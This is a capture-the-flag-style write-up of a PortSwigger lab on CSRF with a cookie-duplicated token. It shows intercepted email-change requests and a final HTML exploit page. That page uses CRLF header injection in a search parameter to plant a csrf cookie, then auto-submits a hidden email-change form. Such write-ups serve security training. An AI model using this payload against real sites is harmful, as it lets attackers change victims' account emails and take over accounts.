---
layout: post
title: "CSRF where the token is duplicated in a cookie"
date: 2026-10-15
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie){:target="_blank"}'s email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Steps

Intercepting the change email request:

```http
POST /my-account/change-email HTTP/2
Host: 0a040085048f81db808e85ed004b009d.web-security-academy.net
Cookie: csrf=8pQCKMVU9Bc5JhwUaIq5ytU5HGiG3cC1; session=cSTBPYsYJBTRNZS9MB9inHxXHispnUvK
Content-Length: 64
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a040085048f81db808e85ed004b009d.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a040085048f81db808e85ed004b009d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

email=jawad1%40example.com&csrf=8pQCKMVU9Bc5JhwUaIq5ytU5HGiG3cC1
```

We notice the CSRF token is duplicated in the cookie.

Changing the last character of both the cookie and the `csrf` value and updating it works, meaning there is no backend validation:

```http
POST /my-account/change-email HTTP/2
Host: 0a040085048f81db808e85ed004b009d.web-security-academy.net
Cookie: csrf=8pQCKMVU9Bc5JhwUaIq5ytU5HGiG3cC2; session=cSTBPYsYJBTRNZS9MB9inHxXHispnUvK
Content-Length: 64
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a040085048f81db808e85ed004b009d.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a040085048f81db808e85ed004b009d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

email=jawad2%40example.com&csrf=8pQCKMVU9Bc5JhwUaIq5ytU5HGiG3cC2
```

Mimicking Lab05 by injecting a cookie via the search feature, the HTML below solves the lab:

```html
<h1>Lab06</h1>

<form method="POST" action="https://0a040085048f81db808e85ed004b009d.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="jawad-lab06@example.com">
  <input type="hidden" name="csrf" value="randomcsrftoken">
</form>

<img src="https://0a040085048f81db808e85ed004b009d.web-security-academy.net/?search=test123%0d%0aSet-Cookie:%20csrf=randomcsrftoken%3b%20SameSite=None" onerror="document.forms[0].submit();">
```
